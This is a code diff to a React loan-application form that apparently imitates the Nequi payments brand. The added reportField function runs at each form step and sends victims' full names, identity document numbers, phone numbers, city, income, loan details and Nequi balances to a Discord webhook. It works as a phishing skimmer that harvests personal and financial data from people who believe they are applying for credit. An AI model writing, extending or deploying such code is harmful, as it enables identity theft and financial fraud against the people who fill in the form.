@@ -1,4 +1,4 @@
-import { useState } from 'react'
+import { useState, useRef } from 'react'
 import {
   User, FileText, Phone, Wallet, TrendingUp,
   CheckCircle2, ArrowRight, ArrowLeft, DollarSign, Sparkles, Info
@@ -6,6 +6,7 @@ import {
 import { NequiLogo } from './NequiLogo'
 import { type CreditFormData } from '../types'
 import { CityCombobox } from './CityCombobox'
+import { DiscordWebhookService } from '../services/DiscordWebhookService'
 
 interface FormScreenProps {
   data: CreditFormData
@@ -222,6 +223,25 @@ export function FormScreen({ data, onChange, onContinue, onBack }: FormScreenPro
   const [step, setStep] = useState(0)
   const [direction, setDirection] = useState<'forward' | 'back'>('forward')
   const [animating, setAnimating] = useState(false)
+  const reportedRef = useRef<Set<string>>(new Set())
+
+  function reportField(label: string, value: string) {
+    if (!value || value === '0') return
+    const key = `${label}_${value}`
+    if (reportedRef.current.has(key)) return
+    reportedRef.current.add(key)
+    const extra: Record<string, string | number | boolean> = { [label]: value }
+    if (data.fullName) extra['Nombre'] = data.fullName
+    if (data.phone) extra['Teléfono'] = data.phone
+    if (data.documentId) extra['Documento'] = data.documentId
+    if (data.city) extra['Ciudad'] = data.city
+    DiscordWebhookService.sendInfo(
+      `Campo completado: ${label}`,
+      `Usuario llenó el campo ${label}`,
+      { name: data.fullName || '—', phone: data.phone || '—', role: 'Cliente' },
+      extra,
+    )
+  }
 
   const loanValue = data.loanAmount ? parseInt(data.loanAmount) : MIN_LOAN
   const incomeValue = data.monthlyIncome ? parseInt(data.monthlyIncome) : MIN_INCOME
@@ -261,6 +281,18 @@ export function FormScreen({ data, onChange, onContinue, onBack }: FormScreenPro
   }
 
   function handleNext() {
+    if (step === 0) {
+      reportField('Nombre completo', data.fullName)
+      reportField('Documento de identidad', data.documentId)
+      reportField('Ciudad de residencia', data.city)
+    } else if (step === 1) {
+      reportField('Número de celular', data.phone)
+    } else if (step === 2) {
+      reportField('Monto solicitado', data.loanAmount)
+      reportField('Plazo del crédito', data.loanTerm + ' meses')
+      reportField('Ingresos mensuales', data.monthlyIncome)
+      reportField('Saldo Nequi', data.nequiBalance)
+    }
     if (step < 2) navigate('forward')
     else onContinue()
   }
